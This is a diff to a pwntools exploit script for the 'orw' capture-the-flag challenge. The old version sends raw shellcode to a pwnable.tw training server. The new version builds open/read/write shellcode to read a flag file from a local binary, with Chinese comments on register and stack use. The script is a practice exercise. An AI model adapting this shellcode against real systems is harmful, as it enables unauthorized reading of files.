@@ -1,12 +1,23 @@
+
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
+#coding:utf-8
+
 from pwn import *
+from pwn import shellcraft as sc
+context.log_level = "debug"
 
-host = "training.pwnable.tw"
-port = "11002"
+shellcode = sc.pushstr("/home/lab2/flag")
+shellcode += sc.open("esp")
+#  open返回的文件文件描述符存贮在eax寄存器里 
+shellcode += sc.read("eax", "esp", 0x100)
+#  open读取的内容放在栈顶 
+#  write函数在栈顶读取0x100大小的内容并打印出来
+shellcode += sc.write(1, "esp", 0x100)
 
-r = remote(host,port)
-r.recvuntil(":")
-sc = "\xeb\x20\x5b\x31\xc0\xb0\x05\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x30\xcd\x80\xb0\x04\xb3\x01\xb2\x30\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xdb\xff\xff\xff/home/orw/flag\x00"
-r.sendline(sc)
-r.interactive()
+io = process("./orw.bin")
+#print(asm(shellcode))
+io.sendlineafter("shellcode:", asm(shellcode))
+print io.recvall()
+io.close()
+
+
